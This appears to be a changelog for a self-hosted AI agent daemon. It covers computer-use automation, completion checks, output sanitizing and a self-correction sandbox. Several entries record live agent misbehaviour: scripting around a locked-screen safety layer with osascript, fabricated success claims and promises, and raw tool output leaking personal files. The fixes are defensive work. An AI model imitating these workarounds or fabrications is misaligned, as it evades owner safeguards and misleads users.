# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

## [0.11.27] - 2026-07-14

### Fixed

- **Completion contracts no longer over-require tools for answer/read-only turns.** Plain knowledge questions such as "why is it called america?", read-only URL summarization, draft-only content help, and note-finding now avoid false mutation contracts and unnecessary verification-block retries, while genuine diagnostics with observable targets still require observation.

## [0.11.26] - 2026-07-12

### Added

- **Vision-driven coordinate clicking for `computer_use`.** GUI automation over web content (a browser) previously dead-ended: the accessibility tree exposes no addressable elements for a web page, so the model was left with an empty list and no path — and defected to brittle terminal AppleScript. Coordinate clicking existed in code but was unusable (it demanded "global points" a model can't derive from a window-cropped Retina screenshot, and required a snapshot the AX walk had just failed to produce). The model now points in normalized image space (0–1000 per axis over the screenshot it was shown); the harness translates to a global point via the window's live frame (resolution/Retina-independent), needs no accessibility snapshot, and the empty-tree result plus tool description steer the model to it.
- **`/wipe` command** — the explicit destructive "permanently delete this conversation" action (with a cannot-be-undone confirmation), registered across Telegram/Slack/Discord. This is the old `/clear` behavior, now opt-in.

### Fixed

- **`/clear` no longer deletes your history.** It previously hard-`DELETE`d all of a session's events and conversation summary — permanent data loss that also starved the memory pipeline (consolidation/extraction/episodes run off the events table) and destroyed the audit trail. `/clear` is now non-destructive: it records a durable context boundary so the next turn starts fresh while every event stays in the database for memory and audit. Use the new `/wipe` for true deletion.
- **`computer_use` runs on the native Google provider.** The GUI-loop capability check rejected everything but the OpenAI-compatible provider, so with `gemini-3.5-flash` as primary a desktop task refused and fell back to AppleScript. The `google_genai` adapter speaks the same multimodal wire format (image_url → inlineData) and is now accepted (Anthropic/xAI native adapters remain excluded).
- **`computer_use` surfaces a locked screen and can't be scripted around it.** Observations (screenshots, accessibility reads) succeed while the Mac is locked, so the model built a picture of a working session and only discovered the lock when its first click bounced — then spent minutes routing around it with terminal `osascript … System Events`. Every observation now carries a "screen is locked" banner, and the terminal blocks AppleScript System Events UI scripting (click/keystroke) as a bypass of the entire computer_use safety layer.
- **Coordinate clicks are verified before a GUI success is claimed.** A coordinate click targets a raw point with no element identity, so the harness cannot tell a hit from a miss the way it can for element clicks — the click always "succeeds" mechanically. A live "Like the third post" reported success on an unverified guessed click. Coordinate-click results now carry an explicit unverified notice, and a GUI success claim is blocked (with a directive to observe and visually confirm) until a deliberate follow-up screenshot/get_app_state confirms the change.

## [0.11.25] - 2026-07-12

### Fixed

- **Background-completion re-engagements are serialized.** A completion arriving while another re-engagement turn was still running spawned a second, concurrent agent loop on the same session — live: two racing loops each launched their own duplicate `find ~/projects` sweeps and posted their own "✅ Done" pings, and each fresh loop got a fresh execution budget, making the chain self-sustaining. Re-engagements now take a global slot held across the whole re-engaged turn; later completions see the earlier turn's results in history instead of redoing the work.
- **Checklist bookkeeping no longer satisfies mutation contracts.** `track_requirements` was classified as a state mutation, so one checklist write made `expects_mutation` gates believe the requested action (a send_file, a post) had happened — which is exactly the hole that let a tool-output paste ship in place of the missing action on a "Send me my resume" turn. The tool now declares Administrative call semantics.
- **Self-contained imperative requests are not "clarification answers."** "Send me my Microsoft resume" arriving right after the assistant's clarifying question about a *different* resume was bound as the answer to that question, injecting the previous topic into the new turn (the model then hunted the wrong directory). An imperative that names its own object (no anaphoric "it/that/one") now classifies as a new request in both the followup classifier and the dialogue-state tracker.

## [0.11.24] - 2026-07-12

### Fixed

- **Stale dialogue requests can no longer hijack followup turns.** Live incident: the assistant offered a numbered menu ("Would you like me to: 1… 2… 3…"), the user replied "Yes do 1, 2", and got an answer to a question from two hours earlier that had already been answered — plus "we haven't established a numbered list." Two independent context defects colliding, both fixed:
  - *Followup injection is now freshness-gated.* A followup turn's "Original request:" injection only carries the dialogue state's open request while it is genuinely pending: answered/superseded requests anchor followups for 10 minutes after resolution, open ones expire after 12 hours. Expired anchors are also dropped at message ingestion, so they can't capture turn classification or tool scoping either (the state previously held requests indefinitely — one session still carried an open request from three weeks prior).
  - *Archived clarifying menus keep their options.* Archived-turn rendering head-truncated the previous turn's final assistant message to 200 chars, which systematically deleted exactly the actionable tail of clarifying menus (the options) — the model literally never saw the list being answered. Messages that look like clarifying questions now keep up to 2,000 chars verbatim (head + tail preserved beyond that); renderer version bumped to invalidate cached renders.
- **Acks now bind to the question they answer.** "Yes do 1, 2" after a clarifying menu was classified by the generic concise-ack branch (→ followup → open-request injection) because that branch outranked the clarification-answer check. The order is fixed, and clarification-answer turns finally have a consumer: the prompt carries "Assistant asked: {question}" — readable even though ingestion clears the open question, via a new `last_closed_question` stash (30-minute per-exchange TTL, cleared on topic change; serde-defaulted so stored states migrate cleanly).
- **Stale clarifying questions can't swallow new requests.** A pending menu older than 30 minutes no longer captures arbitrary short replies ("Send me my makpar resume") as "clarification answers"; ack-like replies still bind regardless of age, since answering a menu after a long pause is normal.
- **The tool-output "paste" whack-a-mole traced to its real source: the daemon's own completion recovery.** A live "Send me my resume" turn shipped a raw `ls -R` of personal PDF filenames under "Here's the command output:" — through the v0.11.23 general paste guard. The reply was not the model pasting: the model deferred, and the first-post-tool-deferral recovery *built* that reply from the latest tool output. Three compounding defects fixed:
  - *Recovery pastes are now gated on the completion contract.* When the turn expects a mutation that hasn't happened (a send_file, a post, a write), recovery may not substitute a tool-output paste for the missing action — the stall path nudges the model toward the action instead. Applied to both the deferral-recovery and empty/low-signal-recovery sites.
  - *The structured-output sniff no longer mistakes the untrusted-data wrapper for JSON.* Every wrapped tool output starts with `[`, so `tool_output_requires_final_synthesis` routed ALL wrapped outputs into the excerpt-paste path; it now sniffs the content with control markers stripped. The plain builder also embeds marker-stripped content, so the user-facing sanitizer can no longer gut a built reply into a dangling stub.
  - *The paste detector is whitespace-normalized.* Exact line equality was defeated by the sanitizer's own spacing normalization (" .pdf" → ".pdf" flipped 4 of 8 lines → 50% match < 70% threshold) and by model spacing drift; lines are now compared with whitespace collapsed. The guard also only bounces model-authored replies — daemon-built recovery replies are deliberate and policy-gated at their build site, not re-judged by shape.

## [0.11.23] - 2026-07-11

### Fixed

- **Final answers that paste raw tool output are caught generally, not per-shape.** The model (a small local model) sometimes ships a recent tool result verbatim instead of answering. The existing guards matched specific *shapes* — a read_file page, a JSON blob — so every new shape it pasted was a fresh hole (latest: a `search_files` list of absolute file paths shipped under "Here are the results:"). A new shape-independent check asks whether the final reply's own content substantially (≥70% of content lines) duplicates the latest tool output — catching path lists, raw terminal output, JSON, or file pages with one detector. On a hit it uses the existing one-shot retry + re-steer ("don't paste raw tool output; name matches by filename or say none matched; deliver files with `send_file`"), and only reads the tool result when the cheap shape checks miss, so there's no per-turn cost otherwise.

## [0.11.22] - 2026-07-11

### Fixed

- **Dead tasks no longer wedge a recurring goal's completion.** `complete_goal` treated any task not in `completed`/`skipped` as "still incomplete" — including terminal-but-dead states (`failed`/`blocked`/`interrupted`/`cancelled`/`abandoned`). A dead task never advances to `completed`, so one left over from a prior run permanently blocked the goal. Observed live on a daily scheduled goal: watchdog-interrupted tasks from earlier fires blocked every new fire's `complete_goal`, so each fire looped trying to "resolve" them, got interrupted itself, and piled up (178+) dead tasks that never cleared. Completion now blocks only on genuinely-active tasks (`pending`/`running`/`claimed`), via a shared `is_terminal_task_status` that mirrors the heartbeat's terminal classification (the two were inconsistent, which is what caused the wedge).

## [0.11.21] - 2026-07-11

### Fixed

- **Unclosed untrusted-data markers no longer leak raw tool output.** When a final reply echoed a `[UNTRUSTED EXTERNAL DATA …]`-wrapped tool result that was cut off before its `[END …]` tag (e.g. a truncated multi-line dump), the line-bounded fallback sanitizer erased only the marker's own line and shipped every following line of raw content to the user — a real data leak (observed live: a resume-search `mdfind`/`ls` file listing delivered as "Here's the command output: …"). The unclosed-marker rule now strips from the marker to end-of-string, and the existing gutted-reply safety net catches the residual stub and retries into an honest fallback.
- **Goals no longer repeat a mutating action when only verification fails.** A failed or unavailable verification read (read-restricted API tier, eventual-consistency delay, transient tool error) previously could spawn a remediation task that re-ran the original mutating call — causing duplicate real-world side effects (e.g. duplicate tweets/sends/charges). The task-lead prompt and the heartbeat orphan-reclaim path now treat a mutating executor's own success response (2xx / created id) as the completion signal, and only repeat the mutating action when that original call itself errored — never solely because a downstream read step failed.

### Added

- **`db_probe --dynamic-bots`**: lists connected dynamic bots (channel + `allowed_user_ids`, tokens redacted) for auditing which bots exist and who is allowed to drive them.

## [0.11.20] - 2026-07-03

### Fixed

- **Promise fabrication closed across every dimension**: final answers that claim in-progress work ("I'm searching the API now...") or promise future work ("I'll try a web search instead", "I will present the trials shortly") now bounce into the recovery ladder on every trust tier, regardless of reply length, tense, or the task's tool history — the only pass is genuinely pending background work. A closing line that promises content delivery ("I will answer both clearly.") bounces even when its verb is a knowledge verb; performative acknowledgments ("I'll remember that...") still ship. Four live incidents in one day drove the successive scopings out.
- **Inline raw JSON dumps never ship as final answers**: a reply that is a short lead-in plus a large JSON blob gets the same one-shot answer-don't-paste retry as the spilled-file-page case (which itself gained coverage for the stopping-phase stall fallback — the last exit path that could paste raw tool output).
- **Failed work now gets an evidence-fed second chance before the failure report**: when a final answer would ship with uncorrected failed external mutations, the model first receives the ledger evidence and an explicit demand to try a different approach (repeating the failed command shape is forbidden, with a strategy hint). Terminal-command retries that succeed under a different semantic classification (a failed `python -c` parse retried as a successful `grep`) now correct the failure instead of leaving a false all-failed report; precisely-classified tools keep the strict rule so a read can never launder a failed write.
- **Reconciliation reports speak plainly**: "External mutation attempt reconciliation: 0 of 2 attempts succeeded" became "I wasn't able to complete that — the changes didn't go through", with error gists as bullets and a recovery offer; the bare "Done." fallback was replaced with an honest failure notice.
- **Marker-echoed drafts survive as content**: drafts that quote tool results with the untrusted-data envelope still attached are cleaned line-wise (markers dropped, content kept) before the structured rewrite, instead of being gutted wholesale by the sanitizer.
- **Grounding guard stops taxing structured answers**: category headings ("Other Malignancies:") over grounded content no longer read as fabricated entities — plural reply words fold to singular for the evidence match, and leading category adjectives are exempt. Roster-fabrication detection is unchanged.

### Changed

- **Background memory pipeline yields to in-flight agent tasks**: consolidation, extraction, episodes, embeddings, and skill promotion defer while an interactive turn, goal run, or spawned specialist is active (heartbeat jobs skip the tick with a 3x-interval starvation cap; event-driven jobs wait for idle with a 10-minute cap). Stops the pipeline from evicting a goal run's KV-cache prefix mid-run — a measured 5x per-run budget inflation — and stops mid-session history rewrites from breaking the next turn's prompt prefix.
- The structured-answer pass logs its own token usage before merging into the parent call, so merged telemetry rows self-explain.

## [0.11.19] - 2026-07-03

### Fixed

- **Structured-answer pass no longer evicts the interactive KV cache**: the schema pass inherited the caller's llama.cpp slot while sending a tool-less prompt that diverges at token one, replacing the interactive slot's cached sequence — every no-tool answer bounce cost a full cold re-prefill (~60s) on the next iteration. The pass now always routes to the background slot.
- **Core prompt no longer invalidates on memory-salience drift**: pinned core-profile entities were re-sorted by live salience on every render; background recall-count updates and daily recency decay swapped adjacent entities with identical content, changing the core prompt's bytes and forcing a full prompt re-prefill (~13×/day). Pinned sessions now render in pin order, frozen at selection time; content changes still invalidate.
- **Artifact-delivered completion recovery never pastes tool output**: after a successful `send_file`, an empty final model reply recovered by pasting the latest raw tool result (e.g., a recursive directory listing) to the user. Both recovery builders now return the canned send-file closeout instead.
- **LLM-timeout acknowledgements ship a user-facing form**: the model-facing external-action ack ("The requested action completed successfully. Latest result: …" + raw data excerpt) is no longer sent verbatim to the user on compose timeout; short prose results are kept, structured dumps become an offer to summarize.
- **Pasted file pages never ship as final answers**: a final reply that is a verbatim spilled-tool-result page (harness page header + line-numbered content) gets one answer-don't-paste retry before any fallback.
- **`send_file` awaits the delivery receipt** before claiming "File sent"; failures and timeouts produce honest phrasing instead of a fabricated success claim.
- **Goal completion notifications are honest about partial completion**: headers derive from actual task rows ("Goal partially completed (2/4 tasks)" with the unfinished items listed) instead of claiming completion; run-and-report missions ("run X and tell me the result") infer a Check contract instead of a mutation contract, ending false partial scores.

### Changed

- **Structured-answer pass runs a slim rewrite for clean drafts**: instead of re-sending the entire conversation (~20K tokens) and re-answering from scratch on every no-tool answer, a clean draft is re-emitted through the schema with a constant instruction plus the draft alone (~hundreds of tokens, output capped proportional to the draft). Leaky, blank, or truncated drafts keep the full-context re-answer. Measured live: the final-answer step of a multi-step task dropped from ~63s to ~18s, with byte-identical rewrite fidelity.
- **Pretty-printed JSON in `http_request`/`web_fetch` results is losslessly compacted** before size checks, so large API responses stop overflowing into spill files when whitespace was the bulk.
- `ensure-llama-flags.sh` no longer requires `--kv-unified`: the idle-slot RAM cache it enabled never restored a saved sequence in practice (306 saves, 0 loads over 2 days) while its idle-save freed the interactive slot's live KV, making every prompt after ~14K-token conversations start fully cold. Per-slot KV isolation (measured: 99.9% cache retention across cross-slot traffic) replaces it; the tradeoff notes live in the script header.

### Added

- Structured-answer pass telemetry: pass mode (rewrite/re-answer) and draft/response lengths are logged per delivery, so rewrite drift and re-answer frequency are measurable.

## [0.11.18] - 2026-07-02

### Added

- **Structured-answer schema pass**: models listed in `[provider] structured_answer_models` get no-tool final answers re-issued through a strict two-field `{reasoning, response}` JSON schema, draining chain-of-thought that some local models emit as undelimited answer text. Includes truncated-JSON salvage with one retry and a never-ship-raw fallback ladder. Verified live against the challenge-prompt repro.
- **Truncation notices out-of-band (scaffolding provenance, phase 1)**: tools no longer embed the instructional `[⚠ OUTPUT TRUNCATED …]` notice in their returned output. Truncation is carried as structured `ToolCallMetadata.truncation` (`TruncationInfo`) and rendered into the model-visible text at exactly one loop site — after the outcome ledger, error-summary extraction, and failure classifiers have consumed clean text. Terminal background-delivery paths render inline (they bypass the loop). A source lint forbids reintroducing embedded notices.
- **Single evolving background status bubble**: the "⏳ Still on it —" handoff reply is registered as the session's status surface and the completion ping now EDITS it in place ("✅ Done — finished in 1m 3s. Writing up the result now…") instead of stacking a new message. The final answer stays a separate fresh message so it still triggers a channel notification. Telegram-first; other channels behave as before.
- **Shared outbound rate limiter** for Telegram and Slack channel sends.
- **Fabrication audit** (`db_probe --fabrication-audit`): post-hoc trace check flagging tasks whose final reply claims a side-effecting action while the task made zero tool calls.
- **Prefill/decode telemetry**: server-reported prefill/decode timing split, per-call prompt composition (system/tools/history tokens), and computer-use observation size are captured through `TokenUsage` → `LlmCallData` → db_probe.
- Task-end telemetry now logs unresolved required-action counts (keys at debug level) so partial outcomes with fulfilled contracts can be diagnosed post-hoc.

### Changed

- **Completion contracts stopped punishing decomposition**: a verification-only sub-agent mission ("check if the post is live") no longer inherits `expects_mutation` from live-delivery content-mode classification, and executor children no longer carry implicit reverification requirements from mutation-flavored phrases ("deploy") when the parent delegated verification to a sibling task. 29 of 31 partial outcomes in a 72-hour window were this artifact.
- **Mutation-contract gate narrowed to its real targets**: an honest admission that the requested deliverable could not be produced ("couldn't find that file") now passes completion instead of being blocked and re-generated repeatedly; fabricated success claims and content dumps are still blocked.
- Final replies gutted by sanitization (model parroted tool-envelope markers) get one tool-less restatement retry before the deterministic activity-summary fallback; the activity summary's search list is deduplicated.
- Background completion pings only promise a follow-up ("Writing up the result now…") when non-trivial output means a re-engagement turn will actually run.
- `http_request`/`web_search` retries route through the shared backoff helper.
- Computer-use flows disable thinking mode and keep the target `app` sticky to stop small-model derailment.

### Fixed

- **Successful answers misclassified as tool failures**: a sub-agent quoting `HTTP/2 200` curl output had its success classified as a semantic failure via the `"http/"` error keyword, injecting "the error says: the blog post is live" coaching into the parent loop. An extracted 2xx/3xx status now suppresses the keyword scan.
- **Harness scaffolding leaking to users**: the truncation notice's own wording matched the error-line extractor and was shipped verbatim in a reconciliation fallback reply; scaffolding lines are now filtered from error summaries, reconciliation fallbacks, and external-action acknowledgments (shared `is_internal_scaffolding_line`).
- **Background answers swallowed by sink-path attribution**: `2>/dev/null` stderr redirects were attributed as the command's produced output file, suppressing the completion ping and re-engagement to "deliver" `/dev/null`. Paths under `/dev`, `/proc`, and `/sys` are excluded from deliverable candidates.
- Single-instance daemon lock stops duplicate daemons racing on the database.
- Glob matching and bounded correction contexts (correction-registry FIFO cap).

### Removed

- Never-registered tool sources `token_usage.rs` and `scheduled_goals.rs` (born orphaned in v0.7.0/v0.9.27 — never compiled into any build).


## [0.11.17] - 2026-06-28

### Added

- **Local-model prompt-cache survives goal runs (`--kv-unified`).** llama.cpp's idle-slot KV cache (`--cache-idle-slots`, backed by the `--cache-ram` pool) only activates with a unified KV buffer, which defaults off when `--parallel` is set explicitly — so a goal run's prompt prefix was evicted by the interleaved background memory pipeline and re-prefilled on every call. The flag is now part of the launch, with `scripts/ensure-llama-flags.sh` (idempotent) re-asserting it after any plist recreation and `package-macos-app.sh` running it on every build. Measured impact on a real goal run: cache hit `~0% → ~97%` steady-state, per-call prefill `~18s → ~1s`, and goal budget `~396k → ~115k` for the same self-check.
- **Inline-gate for trivial sub-agent tasks.** A deterministic, conservative classifier (`should_run_inline`, no LLM) refuses to spawn a fresh sub-agent for a single bounded read-only command (count files, `df`, git status, find largest) — telemetry showed those each cost ~25–45s of cold prefill + a full loop to do ~1s of work. The orchestrator is directed to run them inline with `terminal` instead. Errs hard toward spawning: anything generative/mutating/exploratory/multi-step still delegates.
- **Repeated-failure alerts for recurring goals.** A continuous goal that fails consecutive runs now surfaces an `evergreen_alert` (every Nth failure) instead of silently retrying forever; a successful run clears the streak.
- **Telegram long-polling can no longer wedge silently.** `getUpdates` failures now log loudly under our own tracing target (not teloxide's dropped one), and a watchdog restarts the dispatcher with a fresh connection if polling fails continuously past a threshold — fixing a post-restart wedge where the daemon stayed alive but stopped receiving messages with zero log output.

### Changed

- **Goal budgets charge real incremental work, not re-billed cached prefix.** With prompt caching, ~95%+ of each call's input is a cache read of the stable system-prompt prefix; the budget previously charged it at full price every turn, so multi-turn goals hit their cap on near-free re-reads. `TokenUsage::budget_tokens()` now charges fresh input + output (falling back to full input when no cache info is reported), cutting billed budget ~3.4× on a real run.
- **One self-editing progress surface for scheduled/background runs.** The "🔄 Running scheduled task" announcement is posted as a tracked message and folds into the progress heartbeat, which edits it in place — one updating message instead of a separate announcement plus a stream of pings, matching the foreground live-status surface.
- **Short goal labels across all user-facing surfaces.** Progress lines, the repeated-failure / idle alerts, the schedule-confirmation card, and the "✅ Scheduled" echoes now show a concise `short_goal_label` instead of the full goal-instruction blob. The progress line also skips the internal "Scheduled check" parent task; the completion summary skips that parent task and strips internal `[SYSTEM: …]` markers.

### Fixed

- **A single run failure no longer terminally kills a continuous goal.** `fail_goal` set `status="failed"` unconditionally, so when a recurring goal's run failed (e.g. a deploy step), the whole goal stopped firing forever. Continuous goals now stay active and retry next cycle (recording the failure for repeated-failure detection); only finite goals are marked failed.
- **Day-aware daily-budget gate.** The budget gate now blocks only on the *current* day's usage, fixing a rollover deadlock where the previous day's spend kept a goal from firing after midnight.
- **CI flake in heartbeat tests.** Keep the temp DB file alive in `test_state_store` so a dropped temp file no longer surfaces as a "no such table: goals" failure.

## [0.11.16] - 2026-06-27

### Added

- **macOS computer-use maturation.** A `launch_app` action with auto-launch/activate (and an actionable error when the target app isn't running); targeting elements by **label** with focus-then-type instead of by brittle index; **synonym-aware** descriptor targeting; a deeper accessibility-tree walk for browsers plus scrolling without an explicit target; navigation keys in `press_key` (PageDown, arrows, Home/End, …); and distinct detection/reporting of a locked screen.
- **Computer-use action auditing.** Each computer-use action is persisted to the events store (DB-auditable), and a new telemetry record captures per-call offered/chosen tools and result transforms in the database.
- **Telegram: resolved approval cards auto-dismiss** once acted on.

### Changed

- **Computer-use is gated to DMs and internal sessions only**, and the model is anchored to *act* rather than narrate. Post-click verification with a visible cursor is on by default.
- **The computer-use accessibility tree stays inline** in context (never spilled/compressed), and superseded trees are collapsed to bound context growth.

### Fixed

- **Stack-overflow crash loop from nested sub-agent spawning.** Spawned child agents ran inline on the parent's tokio worker stack; a 3-deep orchestrator→task_lead→executor chain overflowed the default 2 MB stack and crash-looped the daemon. Children now run on their own task (polling from the worker stack base), and the worker stack size was enlarged for headroom.
- **Continuous scheduled goals no longer die silently.** A continuous goal idle >30 days was silently skipped forever (it could never record progress, a permanent deadlock); it now keeps firing and surfaces a one-time alert. A goal's `last_useful_action` is also refreshed whenever a task completes (not only when a schedule fires), so freshness stays accurate.
- **OAuth tokens recover automatically at startup.** When the stored access token is unavailable (e.g. `NO_KEYCHAIN` mode reading a `.env` without the bearer, or an expired token), the daemon now refreshes from the refresh token + client credentials instead of leaving the service unauthenticated. Also fixes ordinary bearer expiry across restarts.
- **`http_request` retries transient upstream 5xx** for idempotent methods (GET/HEAD/OPTIONS) with backoff, so a one-off server hiccup no longer hard-blocks scheduled work. Writes and rate-limits (429) are never retried.
- **Computer-use reliability.** Click verification is keyed on a stable element identity rather than index; the descriptor resolver no longer mis-matches exact names via synonyms; element-specific click verification with a real click on web; modifiers are held in `press_key_combo` (e.g. Command+A); a text field is cleared before typing; an actionable error is returned when a window is off the active Space; a screenshot no longer invalidates the snapshot generation; and the target app is auto-activated before synthetic input.

## [0.11.15] - 2026-06-25

### Added

- **Single live status surface (Telegram).** A task's progress now renders into **one self-editing message per turn** instead of a stream of separate messages (a typical "create a script, run it, send the file" task dropped from ~8 messages to the surface + the deliverable). The plan checklist, per-tool activity, and the final reply all flow into the same message: it is lazily created on the first substantial progress event, edited in place as work proceeds (☐→✅ for a plan, or a single `⏳ …` line for plan-less turns), and at the end either becomes the final reply (edited in) or flips to a done state before the deliverable is sent. Built on a new `LiveStatus` owner + `HubSurfaceSink` (using the channel-agnostic `send_text_tracked`/`edit_text` hub APIs, so it survives the per-turn status task being aborted) and a new `StatusUpdate::Checklist` variant. Fast/trivial turns create no surface at all. Slack/Discord compile against the new variant and degrade to the prior throttled-send behavior.

### Changed

- **Raw shell commands and process ids never appear in user-facing chat.** Commands and pids are kept in tool results and logs (so the model still sees exactly what ran), but are stripped from every user-facing surface: the live status line, the auto-delivered background result-file caption, background-completion notices ("moved to background"/"finished" pid lines are gone), and the "Activity summary" fallback recaps (which now read "Commands run: N commands"). The suppression is unconditional, including in private DMs.
- **Final replies and status content render Markdown on Telegram.** The live-surface create/edit path now converts Markdown → Telegram HTML (matching the normal send path), and the plain-text fallback used when an HTML send is rejected now strips Markdown (bold/italic/headings/inline code → plain, list bullets → `•`, `[text](url)` → `text (url)`) instead of only stripping LaTeX — so a reply with `### **Heading**` no longer shows raw markup.
- **The requirement checklist is delivered as a status event, unified onto the live surface.** `track_requirements` no longer posts/edits its own message through the hub; it emits the rendered checklist as `StatusUpdate::Checklist`, which the live surface renders. The checklist update bypasses the status throttle (it arrives immediately after the tool's own start ping and was previously dropped), so the plan reliably appears. Auto-completion of checklist items from other successful tool calls is preserved — only its delivery changed. The now-unused `ui_message_id` checkpoint plumbing and the separate final recap UI were removed.
- **Emoji-only reactions are interpreted by the model.** A single-emoji turn was short-circuited to a canned "Got it."; because an emoji reaction's meaning depends on conversational context and tone, it now goes through the model. Text acknowledgements ("thanks"/"ok") keep the cheap local shortcut.
- **Faster local/dev rebuilds.** `scripts/package-macos-app.sh --build --debug` now does a debug build (skips release optimization) for quick local iteration; `--build` alone still produces the optimized release binary.

### Fixed

- **Background tasks no longer end prematurely.** Avoids cutting a background task short before its follow-up work completes.
- **Coalesced goals with failed dependencies are unblocked.** A goal coalesced with a dependency that failed is no longer left stuck.

## [0.11.14] - 2026-06-25

### Added

- **Task-planner telemetry (internal).** The task planner now emits `HandHoldingTelemetry` decision points — planner result stats (step / success-criteria counts, contract present/changed), auxiliary model-call telemetry, and planning-skip reasons — keyed by `task_id` so planner efficacy is queryable instead of log-only. Gated by `diagnostics.record_decision_points`; surfaced in `db_probe`.

- **Requirement-checklist items auto-complete from successful tool calls.** After a tool call succeeds, the daemon reconciles the live requirement checklist — marking obvious tool-backed items complete (a file written, a command run, a file sent) and editing the live checklist message in place — so progress is reflected without relying on the model to call `track_requirements` for every step. Degrades safely when no checklist or editable message exists.

- **Background-detach deliverable delivery.** When a command that produces a file deliverable runs past the 30s foreground timeout and is moved to the background, the daemon now delivers the produced file when the command finishes — instead of force-completing on empty stdout and reporting "no results." At completion the notifier attributes a single explicit produced-output file (from the command's redirection/output-flag targets, a referenced script's write targets, and an mtime within the run window), delivers it directly as a document through a strict media path (no silent text fallback), and marks the matching checklist delivery step complete — all guarded by a process-scoped deliver-once ledger. At detach the turn ends with a neutral handoff ("running in the background — I'll send the result when it's ready") rather than a premature give-up summary; if the command is idle-reaped before the expected file ever appears, the daemon closes out honestly ("the expected output file never appeared, nothing to send") instead of generic scan guidance. Shared `prepare_delivery()` path validation/recovery is reused by both `send_file` and the notifier so security checks are identical.

- **Live-updating checklist message (Telegram).** The requirement checklist now evolves a single message in place (☐→✅) as the model marks items, instead of a static start-post plus a separate recap. Built on two new `Channel` trait methods — `send_text_tracked` (returns an editable message id) and `edit_text` — with safe defaults so channels without in-place editing (Slack/Discord today) automatically fall back to the prior start-post + recap UX. The checklist message id is stored in the plan's checkpoint; the completion gate edits the message to its final state rather than posting an extra recap.

- **Tracked requirement checklist with soft completion verification.** On multi-step / deferred-action turns (gated by the existing `should_create_plan` heuristic), the model is steered to call a new `track_requirements` tool to register the concrete requirements of the request (including deliverables like sending a file) and mark each `completed`/`deferred` as it goes. The checklist is persisted in the existing `plans` store (no new table) and surfaced to the user as a compact list at start. When the model tries to finish with items still unchecked, the agent injects a one-shot nudge and continues the loop (soft verification — no hard gate), then posts a done-vs-deferred recap. Crucially, when a long-running command is moved to the background, the completion re-engagement now loads the persisted checklist and lists the still-unchecked requirements, so a deferred deliverable ("send me the file when done") survives the turn ending — superseding the interim prompt-only steering from the prior fix. Degrades to prior behavior whenever no checklist exists (subagents, storage errors).

- **Supervision gate fires are now persisted as queryable events.** Every supervision-gate fire (`supervision_gate_enforced`) and the `tool_budget_block` hard-cap now emit a `GateTelemetry` decision point — tagged with the heuristic name, `action` (enforced/shadow_skipped), trust `tier`, model, and the turn's `task_id` + `iteration` — alongside the existing in-memory counter. Because each fire is its own event keyed by `task_id`, gate efficacy analysis becomes a query: within-task repeat loops are derivable from `iteration`, and "which gates help vs hurt" is a join from gate fires to the turn's already-persisted `TaskEnd` outcome — no more log archaeology over the volatile in-memory counter. Persistence is gated by `diagnostics.record_decision_points` (default on).
- **Autonomous self-correction bridge (Plan 3c).** When the idle-reaper stops a hung/slow background command, the daemon can now autonomously retry a *materially different, scoped* approach through the correction-sandbox gate and deliver the answer — instead of giving up. The remediation scope is derived from the failed command's target (so a reaped whole-home `du` retries within home as `find <abs path> -size …`), bounded by the `SelfCorrectionController` attempt budget, and constrained by the read-only sandbox (no writes, destructive ops, network, external sends, credential tools, or delegation). **Off by default** (`self_correction.enabled=false`, `shadow_mode=true`); the owner opts in via local config (`enabled=true`, `correction_bypass_enabled=true`, `shadow_mode=false`). Note: at broad (home/disk) scope the autonomous remediation can *read* the contents of non-credential files (an owner-accepted autonomy/safety tradeoff); it can never write or exfiltrate.

- **Durable self-correction ledger and controller (internal).** New `self_correction_attempts` table and `SelfCorrectionController` provide bounded, restart-safe attempt policy — repeat-blocking of known-bad approaches, a K=3 distinct-failure budget, and an honest give-up report. Not yet wired into the agent loop (foundation for in-loop self-correction).
- **Correction-mode sandbox classifier (internal).** New `classify_action` + `CorrectionSubjectContext` decide whether an action may run during autonomous self-correction. Hardened to **default-deny**: only an explicitly safe action is allowed and everything unrecognized/approval-requiring/mutating is blocked. Terminal/`run_command` are restricted to `RiskLevel::Safe` read-only commands whose path operands stay inside the subject's `working_dir` (with secret-file and `~`/`$HOME` guards); `mcp__*`, delegation (`cli_agent`/`spawn_agent`), credential/config tools, `browser`/`computer_use`, file writes, and memory/goal mutations are blocked; authenticated/mutating HTTP requires an intended-account/target match (domain-aware). `run_command` build/test commands remain allowed in correction mode as an owner-ratified fix-verification capability. Pure policy.
- **Correction-mode execution context + per-call gate + one-shot preapproval (Plan 3b, internal).** New `CorrectionExecutionContext`, a kill-switch factory (off by default — `self_correction.enabled` and `correction_bypass_enabled` both default `false`; unattended dispatch with bypass disabled is never started, so it cannot hang on approval), and a per-call gate (`attempt` budget → `classify_action` → execute / block / give-up) that runs before tool execution in a correction task. When an action is allowed under bypass, approval is satisfied by a **one-shot Rust execution-context token** (`ToolExecutionContext.correction_preapproved`) — never a model-visible JSON field, never mutating any approval store — that lets only `terminal`/`http_request` skip the approval *prompt* (all parsing, risk classification, and hard-blocks still run). Correction mode also **suppresses `_trusted_session`** (including scheduled-goal provenance) and **disables read-only prefetch** so no I/O runs before classification. Blocked attempts persist as `BLOCKED`, executed ones as a neutral `EXECUTED`, and all signatures/reasons are secret-redacted. Plan 3b provides the context/gate infrastructure only; **no production path constructs a bypass context yet** — Plan 3c wires the unattended idle-reap dispatch.
- **Self-correction ledger is pruned by retention.** `self_correction_attempts` rows older than `state.retention.self_correction_attempts_days` (default 30) are deleted by the daily retention sweep, so the durable attempt ledger cannot grow unbounded.
- **Pre-flight guard against whole-disk/home scans.** `du -a /`, `du -ah ~`, and `find /`/`find ~` (without `-maxdepth`) are now blocked *before* they run, with guidance to scope the command (a specific folder, a size filter, or a depth limit). Previously these unbounded scans ground for many minutes and got auto-stopped without ever answering. Scoped or depth-limited variants are unaffected.

### Changed

- **Stuck-task interrupts now log their inactivity duration** (`inactivity_secs`), so the watchdog's inactivity threshold can be tuned from real data.
